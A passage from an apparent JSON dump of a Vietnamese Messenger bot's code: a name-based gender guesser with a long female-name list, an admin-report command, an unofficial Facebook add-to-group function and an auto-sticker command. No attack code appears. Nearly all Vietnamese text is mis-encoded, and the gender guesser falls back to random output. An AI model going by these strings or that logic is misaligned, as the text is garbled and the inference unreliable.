\"Thu Th·ªßy\",\n      \"Thu Trang\",\n      \"Thu Vi·ªát\",\n      \"Thu V√¢n\",\n      \"Thu V·ªçng\",\n      \"Thu Y·∫øn\",\n      \"Thu·∫ßn H·∫≠u\",\n      \"Thy Khanh\",\n      \"Thy Oanh\",\n      \"Thy Tr√∫c\",\n      \"Thy V√¢n\",\n      \"Th√°i Chi\",\n      \"Th√°i H√†\",\n      \"Th√°i H·ªìng\",\n      \"Th√°i Lan\",\n      \"Th√°i L√¢m\",\n      \"Th√°i Thanh\",\n      \"Th√°i Th·∫£o\",\n      \"Th√°i T√¢m\",\n      \"Th√°i V√¢n\",\n      \"Th√πy Anh\",\n      \"Th√πy Dung\",\n      \"Th√πy D∆∞∆°ng\",\n      \"Th√πy Giang\",\n      \"Th√πy Linh\",\n      \"Th√πy Mi\",\n      \"Th√πy My\",\n      \"Th√πy Nhi\",\n      \"Th√πy Nh∆∞\",\n      \"Th√πy Oanh\",\n      \"Th√πy Uy√™n\",\n      \"Th√πy V√¢n\",\n      \"Th√∫y Anh\",\n      \"Th√∫y Di·ªÖm\",\n      \"Th√∫y Hi·ªÅn\",\n      \"Th√∫y Huy·ªÅn\",\n      \"Th√∫y H√†\",\n      \"Th√∫y H∆∞∆°ng\",\n      \"Th√∫y H∆∞·ªùng\",\n      \"Th√∫y H·∫°nh\",\n      \"Th√∫y H·∫±ng\",\n      \"Th√∫y Ki·ªÅu\",\n      \"Th√∫y Li√™n\",\n      \"Th√∫y Li·ªÖu\",\n      \"Th√∫y Loan\",\n      \"Th√∫y Mai\",\n      \"Th√∫y Minh\",\n      \"Th√∫y My\",\n      \"Th√∫y Nga\",\n      \"Th√∫y Ng√†\",\n      \"Th√∫y Ng√¢n\",\n      \"Th√∫y Ng·ªçc\",\n      \"Th√∫y Ph∆∞·ª£ng\",\n      \"Th√∫y Qu·ª≥nh\",\n      \"Th√∫y Vi\",\n      \"Th√∫y Vy\",\n      \"Th√∫y V√¢n\",\n      \"Th∆° Th∆°\",\n      \"Th∆∞ L√¢m\",\n      \"Th∆∞ S∆∞∆°ng\",\n      \"Th∆∞∆°ng Huy·ªÅn\",\n      \"Th∆∞∆°ng Nga\",\n      \"Th∆∞∆°ng Th∆∞∆°ng\",\n      \"Th∆∞·ªùng Xu√¢n\",\n      \"Th·∫°ch Th·∫£o\",\n      \"Th·∫£o H∆∞∆°ng\",\n      \"Th·∫£o H·ªìng\",\n      \"Th·∫£o Linh\",\n      \"Th·∫£o Ly\",\n      \"Th·∫£o Mai\",\n      \"Th·∫£o My\",\n      \"Th·∫£o Nghi\",\n      \"Th·∫£o Nguy√™n\",\n      \"Th·∫£o Nhi\",\n      \"Th·∫£o Quy√™n\",\n      \"Th·∫£o Ti√™n\",\n      \"Th·∫£o Trang\",\n      \"Th·∫£o Uy√™n\",\n      \"Th·∫£o Vy\",\n      \"Th·∫£o V√¢n\",\n      \"Th·ª•c Anh\",\n      \"Th·ª•c Khu√™\",\n      \"Th·ª•c Nhi\",\n      \"Th·ª•c Oanh\",\n      \"Th·ª•c Quy√™n\",\n      \"Th·ª•c Trang\",\n      \"Th·ª•c Trinh\",\n      \"Th·ª•c T√¢m\",\n      \"Th·ª•c Uy√™n\",\n      \"Th·ª•c V√¢n\",\n      \"Th·ª•c √êoan\",\n      \"Th·ª•c √ê√†o\",\n      \"Th·ª•c √ê√¨nh\",\n      \"Th·ª•y Du\",\n      \"Th·ª•y Khanh\",\n      \"Th·ª•y Linh\",\n      \"Th·ª•y L√¢m\",\n      \"Th·ª•y Mi√™n\",\n      \"Th·ª•y N∆∞∆°ng\",\n      \"Th·ª•y Trinh\",\n      \"Th·ª•y Tr√¢m\",\n      \"Th·ª•y Uy√™n\",\n      \"Th·ª•y V√¢n\",\n      \"Th·ª•y √ê√†o\",\n      \"Th·ªßy H·∫±ng\",\n      \"Th·ªßy H·ªìng\",\n      \"Th·ªßy Linh\",\n      \"Th·ªßy Minh\",\n      \"Th·ªßy Nguy·ªát\",\n      \"Th·ªßy Qu·ª≥nh\",\n      \"Th·ªßy Ti√™n\",\n      \"Th·ªßy Trang\",\n      \"Th·ªßy T√¢m\",\n      \"Tinh T√∫\",\n      \"Ti√™n Ph∆∞∆°ng\",\n      \"Ti·ªÉu Mi\",\n      \"Ti·ªÉu My\",\n      \"Ti·ªÉu Qu·ª≥nh\",\n      \"Trang Anh\",\n      \"Trang Linh\",\n      \"Trang Nh√£\",\n      \"Trang T√¢m\",\n      \"Trang √ê√†i\",\n      \"Tri·ªÅu Nguy·ªát\",\n      \"Tri·ªÅu Thanh\",\n      \"Tri·ªáu M·∫´n\",\n      \"Trung Anh\",\n      \"Tr√† Giang\",\n      \"Tr√† My\",\n      \"Tr√¢m Anh\",\n      \"Tr√¢m Oanh\",\n      \"Tr√¢n Ch√¢u\",\n      \"Tr√∫c Chi\",\n      \"Tr√∫c Lam\",\n      \"Tr√∫c Lan\",\n      \"Tr√∫c Linh\",\n      \"Tr√∫c Li√™n\",\n      \"Tr√∫c Loan\",\n      \"Tr√∫c Ly\",\n      \"Tr√∫c L√¢m\",\n      \"Tr√∫c Mai\",\n      \"Tr√∫c Ph∆∞∆°ng\",\n      \"Tr√∫c Qu√¢n\",\n      \"Tr√∫c Qu·ª≥nh\",\n      \"Tr√∫c Vy\",\n      \"Tr√∫c V√¢n\",\n      \"Tr√∫c √ê√†o\",\n      \"Tr√∫c ƒê√†o\",\n      \"Tr·∫ßm H∆∞∆°ng\",\n      \"Tuy·∫øt Anh\",\n      \"Tuy·∫øt BƒÉng\",\n      \"Tuy·∫øt Chi\",\n      \"Tuy·∫øt Hoa\",\n      \"Tuy·∫øt H√¢n\",\n      \"Tuy·∫øt H∆∞∆°ng\",\n      \"Tuy·∫øt H·ªìng\",\n      \"Tuy·∫øt Lan\",\n      \"Tuy·∫øt Loan\",\n      \"Tuy·∫øt L√¢m\",\n      \"Tuy·∫øt Mai\",\n      \"Tuy·∫øt Nga\",\n      \"Tuy·∫øt Nhi\",\n      \"Tuy·∫øt Nhung\",\n      \"Tuy·∫øt Oanh\",\n      \"Tuy·∫øt Thanh\",\n      \"Tuy·∫øt Trinh\",\n      \"Tuy·∫øt Tr·∫ßm\",\n      \"Tuy·∫øt T√¢m\",\n      \"Tuy·∫øt Vy\",\n      \"Tuy·∫øt V√¢n\",\n      \"Tuy·∫øt Xu√¢n\",\n      \"Tuy·ªÅn L√¢m\",\n      \"Tu·ªá L√¢m\",\n      \"Tu·ªá M·∫´n\",\n      \"Tu·ªá Nhi\",\n      \"T√¢m Hi·ªÅn\",\n      \"T√¢m H·∫°nh\",\n      \"T√¢m H·∫±ng\",\n      \"T√¢m Khanh\",\n      \"T√¢m Linh\",\n      \"T√¢m Nguy√™n\",\n      \"T√¢m Nguy·ªát\",\n      \"T√¢m Nhi\",\n      \"T√¢m Nh∆∞\",\n      \"T√¢m Thanh\",\n      \"T√¢m Trang\",\n      \"T√¢m √êoan\",\n      \"T√¢m ƒêan\",\n      \"T√πng Linh\",\n      \"T√πng L√¢m\",\n      \"T√πng Qu√¢n\",\n      \"T√πy Anh\",\n      \"T√πy Linh\",\n      \"T√∫ Anh\",\n      \"T√∫ Ly\",\n      \"T√∫ Nguy·ªát\",\n      \"T√∫ Quy√™n\",\n      \"T√∫ Qu·ª≥nh\",\n      \"T√∫ S∆∞∆°ng\",\n      \"T√∫ Trinh\",\n      \"T√∫ T√¢m\",\n      \"T√∫ Uy√™n\",\n      \"T√∫y Loan\",\n      \"T∆∞·ªùng Chinh\",\n      \"T∆∞·ªùng Vi\",\n      \"T∆∞·ªùng Vy\",\n      \"T∆∞·ªùng V√¢n\",\n      \"T·ªãnh L√¢m\",\n      \"T·ªãnh Nhi\",\n      \"T·ªãnh Nh∆∞\",\n      \"T·ªãnh T√¢m\",\n      \"T·ªãnh Y√™n\",\n      \"T·ªë Loan\",\n      \"T·ªë Nga\",\n      \"T·ªë Nhi\",\n      \"T·ªë Quy√™n\",\n      \"T·ªë T√¢m\",\n      \"T·ªë Uy√™n\",\n      \"T·ª´ Dung\",\n      \"T·ª´ √Çn\",\n      \"Uy√™n Minh\",\n      \"Uy√™n My\",\n      \"Uy√™n Nhi\",\n      \"Uy√™n Ph∆∞∆°ng\",\n      \"Uy√™n Thi\",\n      \"Uy√™n Thy\",\n      \"Uy√™n Th∆°\",\n      \"Uy√™n Tr√¢m\",\n      \"Uy√™n Vi\",\n      \"Uy·ªÉn Khanh\",\n      \"Uy·ªÉn My\",\n      \"Uy·ªÉn Nghi\",\n      \"Uy·ªÉn Nhi\",\n      \"Uy·ªÉn Nh√£\",\n      \"Uy·ªÉn Nh∆∞\",\n      \"Vi Quy√™n\",\n      \"Vinh Di·ªáu\",\n      \"Vi·ªát H√†\",\n      \"Vi·ªát H∆∞∆°ng\",\n      \"Vi·ªát Khu√™\",\n      \"Vi·ªát Mi\",\n      \"Vi·ªát Nga\",\n      \"Vi·ªát Nhi\",\n      \"Vi·ªát Thi\",\n      \"Vi·ªát Trinh\",\n      \"Vi·ªát Tuy·∫øt\",\n      \"Vi·ªát Y·∫øn\",\n      \"Vy Lam\",\n      \"Vy Lan\",\n      \"V√†ng Anh\",\n      \"V√†nh Khuy√™n\",\n      \"V√¢n Anh\",\n      \"V√¢n Chi\",\n      \"V√¢n Du\",\n      \"V√¢n H√†\",\n      \"V√¢n H∆∞∆°ng\",\n      \"V√¢n Khanh\",\n      \"V√¢n Kh√°nh\",\n      \"V√¢n Linh\",\n      \"V√¢n Ng·ªçc\",\n      \"V√¢n Nhi\",\n      \"V√¢n Phi\",\n      \"V√¢n Ph∆∞∆°ng\",\n      \"V√¢n Quy√™n\",\n      \"V√¢n Qu·ª≥nh\",\n      \"V√¢n Thanh\",\n      \"V√¢n Th√∫y\",\n      \"V√¢n Th∆∞·ªùng\",\n      \"V√¢n Ti√™n\",\n      \"V√¢n Trang\",\n      \"V√¢n Trinh\",\n      \"V≈© H·ªìng\",\n      \"Xuy·∫øn Chi\",\n      \"Xu√¢n B·∫£o\",\n      \"Xu√¢n Dung\",\n      \"Xu√¢n Hi·ªÅn\",\n      \"Xu√¢n Hoa\",\n      \"Xu√¢n H√¢n\",\n      \"Xu√¢n H∆∞∆°ng\",\n      \"Xu√¢n H·∫°nh\",\n      \"Xu√¢n Lan\",\n      \"Xu√¢n Linh\",\n      \"Xu√¢n Li·ªÖu\",\n      \"Xu√¢n Loan\",\n      \"Xu√¢n L√¢m\",\n      \"Xu√¢n Mai\",\n      \"Xu√¢n Nghi\",\n      \"Xu√¢n Ng·ªçc\",\n      \"Xu√¢n Nhi\",\n      \"Xu√¢n Nhi√™n\",\n      \"Xu√¢n N∆∞∆°ng\",\n      \"Xu√¢n Ph∆∞∆°ng\",\n      \"Xu√¢n Ph∆∞·ª£ng\",\n      \"Xu√¢n Thanh\",\n      \"Xu√¢n Thu\",\n      \"Xu√¢n Th·∫£o\",\n      \"Xu√¢n Th·ªßy\",\n      \"Xu√¢n Trang\",\n      \"Xu√¢n T√¢m\",\n      \"Xu√¢n Uy√™n\",\n      \"Xu√¢n V√¢n\",\n      \"Xu√¢n Y·∫øn\",\n      \"Xu√¢n xanh\",\n      \"Y√™n B·∫±ng\",\n      \"Y√™n Mai\",\n      \"Y√™n Nhi\",\n      \"Y√™n √êan\",\n      \"Y√™n ƒêan\",\n      \"Y·∫øn Anh\",\n      \"Y·∫øn H·ªìng\",\n      \"Y·∫øn Loan\",\n      \"Y·∫øn Mai\",\n      \"Y·∫øn My\",\n      \"Y·∫øn Nhi\",\n      \"Y·∫øn Oanh\",\n      \"Y·∫øn Ph∆∞∆°ng\",\n      \"Y·∫øn Ph∆∞·ª£ng\",\n      \"Y·∫øn Thanh\",\n      \"Y·∫øn Th·∫£o\",\n      \"Y·∫øn Trang\",\n      \"Y·∫øn Trinh\",\n      \"Y·∫øn Tr√¢m\",\n      \"Y·∫øn √êan\",\n      \"√Åi H·ªìng\",\n      \"√Åi Khanh\",\n      \"√Åi Linh\",\n      \"√Åi Nhi\",\n      \"√Åi Nh√¢n\",\n      \"√Åi Thi\",\n      \"√Åi Thy\",\n      \"√Åi V√¢n\",\n      \"√Ånh D∆∞∆°ng\",\n      \"√Ånh Hoa\",\n      \"√Ånh H·ªìng\",\n      \"√Ånh Linh\",\n      \"√Ånh L·ªá\",\n      \"√Ånh Mai\",\n      \"√Ånh Nguy·ªát\",\n      \"√Ånh Ng·ªçc\",\n      \"√Ånh Th∆°\",\n      \"√Ånh Trang\",\n      \"√Ånh Tuy·∫øt\",\n      \"√Ånh Xu√¢n\",\n      \"√êan Khanh\",\n      \"√êan Qu·ª≥nh\",\n      \"√êan Thu\",\n      \"√êinh H∆∞∆°ng\",\n      \"√êoan Thanh\",\n      \"√êoan Trang\",\n      \"√ê√†i Trang\",\n      \"√ê√¥ng Nghi\",\n      \"√ê√¥ng Nhi\",\n      \"√ê√¥ng Tr√†\",\n      \"√ê√¥ng Tuy·ªÅn\",\n      \"√ê√¥ng Vy\",\n      \"√ê√¥ng √ê√†o\",\n      \"√ê·ªìng Dao\",\n      \"√ù B√¨nh\",\n      \"√ù Lan\",\n      \"√ù Nhi\",\n      \"ƒêan Linh\",\n      \"ƒêan Qu·ª≥nh\",\n      \"ƒêan Thanh\",\n      \"ƒêan Thu\",\n      \"ƒêan Th∆∞\",\n      \"ƒêan T√¢m\",\n      \"ƒêinh H∆∞∆°ng\",\n      \"ƒêoan Thanh\",\n      \"ƒêoan Trang\",\n      \"ƒê√†i Trang\",\n      \"ƒê√¥ng Nghi\",\n      \"ƒê√¥ng Tr√†\",\n      \"ƒê√¥ng Tuy·ªÅn\",\n      \"ƒê√¥ng Vy\",\n      \"ƒê∆°n Thu·∫ßn\",\n      \"ƒê·ª©c H·∫°nh\",\n      \"·∫§u LƒÉng\"\n  ]\n  \n      var OtherName = [\".\",\",\",\"/\",\"%\", \"&\",\"*\",\"-\",\"+\"];\n  \n      try {\n          var Name;\n              if (name == \" \" || name == null) return \"UNKNOWN\";\n              switch (female_name.some(a => name.includes(a))) {\n                  case true: {\n                      if (!OtherName.includes(name)) Name = \"FEMALE\";\n                      else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp üåö\n                  }\n              break;\n                  case false: {\n                      if (female_name.some(a => name.split(' ')[name.split(' ').length - 1] == a)) Name = \"FEMALE\";\n                      else if (!OtherName.includes(name) && !female_name.includes(name)) Name = \"MALE\";\n                      else Name = ['FEMALE','MALE'][Math.floor(Math.random() * 2)]; // just temp üåö\n                  }\n              break;\n          } \n      }\n      catch (e) {\n          return \"UNKNOWN\";\n      }\n      return Name || \"UNKNOWN\";\n  }\n  \n\n console.log(getGenderByPhysicalMethod('Nguy·ªÖn Thu Th·∫£o'))","path":null,"size_bytes":28353,"size_tokens":null},"lib/fca-auto/Extra/Security/AES_256_GCM/index.js":{"content":"","path":null,"size_bytes":0,"size_tokens":null},"modules/commands/callad.js":{"content":"module.exports.config = {\n  name: \"callad\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"NTKhang update & fix by DuyVuong and D-jukie\",\n  description: \"Th√¥ng b√°o l·ªói c·ªßa bot ƒë·∫øn admin ho·∫∑c g√≥p √Ω\",\n  commandCategory: \"ƒê√≥ng g√≥p √Ω ki·∫øn\",\n  usages: \"[l·ªói g·∫∑p ph·∫£i ho·∫∑c √Ω ki·∫øn]\",\n  cooldowns: 5,\n};\n\nmodule.exports.handleReply = async function({ api, args, event, handleReply, Users }) {\n  try {\n    var name = (await Users.getData(event.senderID)).name;\n    var s = [];\n    var l = [];\n    const fs = require('fs-extra');\n    const { join } = require('path');\n    const axios = require('axios');\n    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';\n    var charactersLength = characters.length || 20;\n    if (event.attachments.length != 0) {\n      for (var p of event.attachments) {\n        var result = '';\n        for (var i = 0; i < charactersLength; i++) result += characters.charAt(Math.floor(Math.random() * charactersLength));\n        if (p.type == 'photo') {\n          var e = 'jpg';\n        }\n        if (p.type == 'video') {\n          var e = 'mp4';\n        }\n        if (p.type == 'audio') {\n          var e = 'mp3';\n        }\n        if (p.type == 'animated_image') {\n          var e = 'gif';\n        }\n        var o = join(__dirname, 'cache', `${result}.${e}`);\n        let m = (await axios.get(encodeURI(p.url), { responseType: \"arraybuffer\" })).data;\n        fs.writeFileSync(o, Buffer.from(m, \"utf-8\"));\n        s.push(o);\n        l.push(fs.createReadStream(o));\n      }\n    };\n    switch (handleReply.type) {\n      case \"reply\": {\n        var idad = global.config.ADMINBOT;\n        if (s.length == 0) {\n          for (let ad of idad) {\n            api.sendMessage({\n              body: \"[üìÑ]‚Üí Ph·∫£n h·ªìi t·ª´ \" + name + \":\\n\" + (event.body) || \"kh√¥ng c√≥ n·ªôi dung tr·∫£ l·ªùi\", mentions: [{\n                id: event.senderID,\n                tag: name\n              }]\n            }, ad, (e, data) => global.client.handleReply.push({\n              name: this.config.name,\n              messageID: data.messageID,\n              messID: event.messageID,\n              author: event.senderID,\n              id: event.threadID,\n              type: \"calladmin\"\n            }));\n          }\n        }\n        else {\n          for (let ad of idad) {\n            api.sendMessage({\n              body: \"[üìÑ]‚Üí Ph·∫£n h·ªìi t·ª´ \" + name + \":\\n\" + (event.body) || \"ch·ªâ c√≥ t·ªáp kh√¥ng c√≥ n·ªôi dung tr·∫£ l·ªùi\" + \"\\n----------------\\n‚ûú K√®m theo t·ªáp!\", attachment: l, mentions: [{\n                id: event.senderID,\n                tag: name\n              }]\n            }, ad, (e, data) => global.client.handleReply.push({\n              name: this.config.name,\n              messageID: data.messageID,\n              messID: event.messageID,\n              author: event.senderID,\n              id: event.threadID,\n              type: \"calladmin\"\n            }));\n            for (var b of s) {\n              fs.unlinkSync(b);\n            }\n          }\n        }\n        break;\n      }\n      case \"calladmin\": {\n        if (s.length == 0) {\n          api.sendMessage({ body: `‚ûú Ph·∫£n h·ªìi t·ª´ admin ${name} ƒë·∫øn b·∫°n:\\n--------\\n${(event.body) || \"kh√¥ng c√≥ n·ªôi dung tr·∫£ l·ªùi\"}\\n--------\\n[üí¨]‚Üí Ph·∫£n h·ªìi tin nh·∫Øn n√†y ƒë·ªÉ ti·∫øp t·ª•c g·ª≠i b√°o c√°o v·ªÅ admin`, mentions: [{ tag: name, id: event.senderID }] }, handleReply.id, (e, data) => global.client.handleReply.push({\n            name: this.config.name,\n            author: event.senderID,\n            messageID: data.messageID,\n            type: \"reply\"\n          }), handleReply.messID);\n        }\n        else {\n          api.sendMessage({ body: `‚ûú Ph·∫£n h·ªìi t·ª´ admin ${name} ƒë·∫øn b·∫°n:\\n--------\\n${(event.body) || \"ch·ªâ c√≥ t·ªáp kh√¥ng c√≥ n·ªôi dung tr·∫£ l·ªùi\"}\\n--------\\n[üí¨]‚Üí Ph·∫£n h·ªìi tin nh·∫Øn n√†y ƒë·ªÉ ti·∫øp t·ª•c g·ª≠i b√°o c√°o v·ªÅ admin\\n--------\\n‚ûú T·ªáp admin g·ª≠i ƒë·∫øn b·∫°n!`, attachment: l, mentions: [{ tag: name, id: event.senderID }] }, handleReply.id, (e, data) => global.client.handleReply.push({\n            name: this.config.name,\n            author: event.senderID,\n            messageID: data.messageID,\n            type: \"reply\"\n          }), handleReply.messID);\n          for (var b of s) {\n            fs.unlinkSync(b);\n          }\n        }\n        break;\n      }\n    }\n  }\n  catch (ex) {\n    console.log(ex);\n  }\n};\n\nmodule.exports.run = async function({ api, event, Threads, args, Users }) {\n  try {\n    var s = [];\n    var l = [];\n    const fs = require('fs-extra');\n    const { join } = require('path');\n    const axios = require('axios');\n    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';\n    var charactersLength = characters.length || 20;\n    if (event.messageReply) {\n    if (event.messageReply.attachments.length != 0) {\n      for (var p of event.messageReply.attachments) {\n        var result = '';\n        for (var i = 0; i < charactersLength; i++) result += characters.charAt(Math.floor(Math.random() * charactersLength));\n        if (p.type == 'photo') {\n          var e = 'jpg';\n        }\n        if (p.type == 'video') {\n          var e = 'mp4';\n        }\n        if (p.type == 'audio') {\n          var e = 'mp3';\n        }\n        if (p.type == 'animated_image') {\n          var e = 'gif';\n        }\n        var o = join(__dirname, 'cache', `${result}.${e}`);\n        let m = (await axios.get(encodeURI(p.url), { responseType: \"arraybuffer\" })).data;\n        fs.writeFileSync(o, Buffer.from(m, \"utf-8\"));\n        s.push(o);\n        l.push(fs.createReadStream(o));\n      }\n    }\n  }\n    if (!args[0] && event.messageReply.attachments.length == 0)\n      return api.sendMessage(\n        \"‚Üí B·∫°n ch∆∞a nh·∫≠p n·ªôi dung c·∫ßn b√°o c√°o\",\n        event.threadID,\n        event.messageID\n      );\n\n    var name = (await Users.getData(event.senderID)).name;\n    var idbox = event.threadID;\n\n    var datathread = (await Threads.getData(event.threadID)).threadInfo;\n    var namethread = datathread.threadName;\n\n    const moment = require(\"moment-timezone\");\n    var gio = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"HH:mm:ss D/MM/YYYY\");\n    var soad = global.config.ADMINBOT.length;\n    api.sendMessage(\n      \"=== „Äé Success „Äè ===\\n‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±‚ñ±\\n‚ûú  ƒê√£ g·ª≠i n·ªôi dung t·ªõi \" + soad + \" admin bot...\",\n      event.threadID,\n      () => {\n        var idad = global.config.ADMINBOT;\n        if (s.length == 0) {\n          for (let ad of idad) {\n            api.sendMessage({ body: `‚ûú  B√°o c√°o t·ª´: ${name}\\n‚Üí \n Box: ${namethread}\\n‚ûú ID box: ${idbox}\\n----------------\\n‚ûú N·ªôi dung: ${args.join(\n              \" \"\n            )}\\n----------------\\n‚ûú Time: ${gio}`, mentions: [{ id: event.senderID, tag: name }] },\n              ad, (error, info) =>\n              global.client.handleReply.push({\n                name: this.config.name,\n                messageID: info.messageID,\n                author: event.senderID,\n                messID: event.messageID,\n                id: idbox,\n                type: \"calladmin\"\n              })\n            );\n          }\n        }\n        else {\n          for (let ad of idad) {\n            api.sendMessage({\n              body: `‚ûú B√°o c√°o t·ª´: ${name}\\n‚ö°Box: ${namethread}\\n‚ûú ID box: ${idbox}\\n----------------\\n‚ûú L·ªói: ${(args.join(\n                \" \"\n              )) || \"ch·ªâ c√≥ t·ªáp kh√¥ng c√≥ n·ªôi dung b√°o c√°o!\"}\\n----------------\\n‚ûú Time: ${gio}\\n----------------\\n‚ûú K√®m theo t·ªáp!`, attachment: l, mentions: [{ id: event.senderID, tag: name }]\n            },\n              ad, (error, info) =>\n              global.client.handleReply.push({\n                name: this.config.name,\n                messageID: info.messageID,\n                author: event.senderID,\n                messID: event.messageID,\n                id: idbox,\n                type: \"calladmin\"\n              })\n            );\n          }\n          for (var b of s) {\n            fs.unlinkSync(b);\n          }\n        }\n      }\n      , event.messageID);\n  }\n  catch (ex) {\n    console.log(ex);\n  }\n};","path":null,"size_bytes":8161,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getCurrentUserID.js":{"content":"\"use strict\";\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getCurrentUserID() {\n    return ctx.userID;\n  };\n};\n","path":null,"size_bytes":138,"size_tokens":null},"lib/fca-auto/src/addUserToGroup.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function addUserToGroup(userID, threadID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback && (utils.getType(threadID) === \"Function\" || utils.getType(threadID) === \"AsyncFunction\")) throw { error: \"please pass a threadID as a second argument.\" };\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n    \n    if (utils.getType(threadID) !== \"Number\" && utils.getType(threadID) !== \"String\") throw { error: \"ThreadID should be of type Number or String and not \" + utils.getType(threadID) + \".\" };\n\n\n    if (utils.getType(userID) !== \"Array\") userID = [userID];\n\n    var messageAndOTID = utils.generateOfflineThreadingID();\n    var form = {\n      client: \"mercury\",\n      action_type: \"ma-type:log-message\",\n      author: \"fbid:\" + ctx.userID,\n      thread_id: \"\",\n      timestamp: Date.now(),\n      timestamp_absolute: \"Today\",\n      timestamp_relative: utils.generateTimestampRelative(),\n      timestamp_time_passed: \"0\",\n      is_unread: false,\n      is_cleared: false,\n      is_forward: false,\n      is_filtered_content: false,\n      is_filtered_content_bh: false,\n      is_filtered_content_account: false,\n      is_spoof_warning: false,\n      source: \"source:chat:web\",\n      \"source_tags[0]\": \"source:chat\",\n      log_message_type: \"log:subscribe\",\n      status: \"0\",\n      offline_threading_id: messageAndOTID,\n      message_id: messageAndOTID,\n      threading_id: utils.generateThreadingID(ctx.clientID),\n      manual_retry_cnt: \"0\",\n      thread_fbid: threadID\n    };\n\n    for (var i = 0; i < userID.length; i++) {\n      if (utils.getType(userID[i]) !== \"Number\" && utils.getType(userID[i]) !== \"String\") throw { error: \"Elements of userID should be of type Number or String and not \" + utils.getType(userID[i]) + \".\" };\n      form[\"log_message_data[added_participants][\" + i + \"]\"] = \"fbid:\" + userID[i];\n    }\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/messaging/send/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (!resData) throw { error: \"Add to group failed.\" };\n        if (resData.error) throw resData;\n\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"addUserToGroup\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":2699,"size_tokens":null},"modules/commands/atstk.js":{"content":"const fs = require('fs');\nconst path = require('path');\n\nmodule.exports.config = {\n    name: \"atstk\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"auto sticker\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"atstk on/off\",\n    cooldowns: 5,\n};\n\nconst messageCount = {};\nconst stickerList = [\n    \"8298114373607613\",\n    \"607944812984452\",\n    \"369239263222822\",\n    \"184571475493841\",\n    \"155887105126297\",\n    \"551710554864076\",\n    \"788171717923679\",\n    \"8298124896939894\",\n    \"1458999184131858\",\n    \"369239383222810\",\n    \"1598371140426188\",\n    \"1598410647088904\",\n    \"1649890685274233\",\n    \"1598405803756055\",\n    \"1598406790422623\",\n    \"1458993787465731\",\n    \"2041015329459274\",\n    \"1458994000799043\",\n    \"1458994024132374\",\n    \"2041011726126301\",\n    \"2041011836126290\",\n    \"041011389459668\",\n    \"2041021119458695\",\n    \"2041021119458695\",\n    \"1747085962269322\",\n    \"295920800855997\",\n    \"1747083702269548\",\n    \"369239263222822\",\n    \"184571475493841\",\n    \"155887105126297\",\n    \"551710554864076\",\n    \"788171717923679\",\n    \"1458999184131858\",\n    \"369239383222810\",\n    \"1598371140426188\",\n    \"1598410647088904\",\n    \"1330354587154466\",\n    \"1390600217908126\", \n    \"1390506597917488\", \n    \"785424208295600\",\n    \"629265523856431\",\n    \"1330354290487829\",\n    \"181834558976193\", \n    \"157616594731323\", \n    \"334220426780978\",\n    \"334196663450021\",\n    \"1598357893760846\",\n    \"1578941069102354\",\n    \"1330353857154539\",\n    \"1649890685274233\",\n    \"1598405803756055\",\n    \"1598406790422623\",\n    \"1458993787465731\",\n    \"2041015329459274\",\n    \"1458994000799043\",\n    \"1458994024132374\",\n    \"2041011726126301\",\n    \"2041011836126290\",\n    \"041011389459668\",\n    \"2041021119458695\",\n    \"1747085962269322\",\n    \"1747083702269548\",\n    \"483272161088794\",\n    \"1017524943189355\",\n    \"1138381244129430\",\n    \"1652591134767287\"\n    ];\n\nconst threadSettingsPath = path.join(__dirname, 'data', 'threadSettings.json');\n\nconst getThreadSettings = () => {\n    if (!fs.existsSync(threadSettingsPath)) {\n        fs.writeFileSync(threadSettingsPath, JSON.stringify({}));\n    }\n    return JSON.parse(fs.readFileSync(threadSettingsPath, 'utf-8'));\n};\n\nconst saveThreadSettings = (settings) => {\n    fs.writeFileSync(threadSettingsPath, JSON.stringify(settings, null, 4));\n};\n\nconst getRandomSticker = () => {\n    const randomIndex = Math.floor(Math.random() * stickerList.length);\n    return stickerList[randomIndex];\n};\n\nmodule.exports.handleEvent = async function ({ api, event }) {\n    if (event.type !== \"message\") return;\n\n    const threadID = event.threadID;\n    const threadSettings = getThreadSettings();\n\n    if (!threadSettings[threadID] || threadSettings[threadID] !== \"on\") return;\n\n    if (!messageCount[threadID]) {\n        messageCount[threadID] = 0;\n    }\n\n    messageCount[threadID] += 1;\n\n    if (messageCount[threadID] >= 10) {\n        const stickerID = getRandomSticker();\n\n        api.sendMessage({ sticker: stickerID }, threadID, (error) => {\n            if (error) console.error(error);\n        });\n        messageCount[threadID] = 0;\n    }\n};\n\nmodule.exports.run = async function ({ api, event, args }) {\n    const threadID = event.threadID;\n    const threadSettings = getThreadSettings();\n\n    if (args[0] === \"on\") {\n        threadSettings[threadID] = \"on\";\n        saveThreadSettings(threadSettings);\n        return api.sendMessage(\"ƒê√£ b·∫≠t t√≠nh nƒÉng g·ª≠i sticker ng·∫´u nhi√™n cho nh√≥m n√†y.\", threadID);\n    } else if (args[0] === \"off\") {\n        threadSettings[threadID] = \"off\";\n        saveThreadSettings(threadSettings);\n        return api.sendMessage(\"ƒê√£ t·∫Øt t√≠nh nƒÉng g·ª≠i sticker ng·∫´u nhi√™n cho nh√≥m n√†y.\", threadID);\n    } else {\n        return 